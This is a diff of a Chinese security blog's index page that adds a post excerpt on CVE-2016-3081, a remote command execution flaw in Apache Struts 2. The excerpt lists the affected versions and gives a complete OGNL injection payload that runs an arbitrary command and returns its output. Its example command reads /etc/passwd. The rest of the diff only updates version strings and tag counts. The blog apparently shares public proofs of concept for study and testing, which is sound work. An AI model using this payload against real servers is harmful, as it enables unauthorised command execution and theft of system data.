@@ -17,7 +17,7 @@
     <link rel="shortcut icon" href="/favicon.ico" >
     
     
-<link rel="stylesheet" href="/css/style.css?v=1612346619832.css">
+<link rel="stylesheet" href="/css/style.css?v=1612424791080.css">
 
     <!--[if lt IE 9]>
     
@@ -111,6 +111,55 @@
             
         </strong>
     </h3>
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+            <a href="javascript: void(0);" class="cat">未分类</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="https://givemefivw.github.io/2020/12/20/CVE-2016-3081-Struts-032%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CPOC/">
+    		CVE-2016-3081 Struts-032远程命令执行POC
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        Jelon 发表于
+        <time datetime="2020-12-20T11:30:56.000Z">2020-12-20</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                <h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外）</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp&#x3D;%5C%5CA&amp;ppp&#x3D;%20&amp;encoding&#x3D;UTF-8&amp;cmd&#x3D;cat &#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/2020/12/20/CVE-2016-3081-Struts-032%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CPOC/1.png"></p>
+
+            
+            <p class="more">
+                <a href="https://givemefivw.github.io/2020/12/20/CVE-2016-3081-Struts-032%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CPOC/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="https://givemefivw.github.io/2020/12/20/CVE-2016-3081-Struts-032%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CPOC/" title="CVE-2016-3081 Struts-032远程命令执行POC">
+                
+                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/0.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
     
         <!-- 文章列表 item -->
 <article class="post">
@@ -370,7 +419,7 @@
     
     <li>
         <a href="/categories/POC-EXP/">POC&amp;EXP</a>
-        <span class="badge">(10)</span>
+        <span class="badge">(11)</span>
     </li>
     
     <li>
@@ -397,7 +446,7 @@
   
     <a class="tag-item" href="/tags/%E8%84%9A%E6%9C%AC/" title="脚本">脚本 (1)</a>
   
-    <a class="tag-item" href="/tags/PoC/" title="PoC">PoC (1)</a>
+    <a class="tag-item" href="/tags/PoC/" title="PoC">PoC (2)</a>
   
 </div>
     </section>
@@ -441,7 +490,7 @@
     <!--博客js脚本 -->
     <!-- 这里放网站js脚本 -->
 
-<script src="/js/main.js?v=1612346619833.js"></script>
+<script src="/js/main.js?v=1612424791081.js"></script>
 
 
 </body>
